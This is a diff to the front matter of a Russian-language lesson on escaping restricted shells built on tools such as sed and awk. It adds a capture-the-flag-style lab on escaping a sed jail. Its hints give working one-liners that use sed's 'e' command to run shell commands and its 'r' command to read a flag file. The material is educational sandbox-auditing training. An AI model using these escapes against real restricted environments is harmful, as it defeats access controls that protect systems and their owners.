@@ -13,6 +13,17 @@ useful_for:
   - "Аудит песочниц"
 estimated_minutes: 32
 summary: "Побеги из джейлов на awk, sed, vim, perl, ruby и Lua: вызов команд, чтение файлов, обход фильтров и восстановление полноценного shell."
+lab:
+  kind: shell
+  title: 'Практика: побег из sed-джейла'
+  toolset: [core, sed]
+  workdir: /home/student/task
+  files: [task.md, run.sh]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Сервис прогоняет ввод через фиксированный `sed`-скрипт. У `sed` есть команда `e` — выполнить результат подстановки как shell-команду.'
+    - 'Передай: `echo x | sed ''s/x/cat flag.txt/e''` — флаг подставится и исполнится.'
+    - 'Если `e` вырезано, у `sed` есть команда `r` — чтение файла: `echo "" | sed ''r flag.txt''`.'
 ---
 
 ## Вопрос, с которого всё начинается
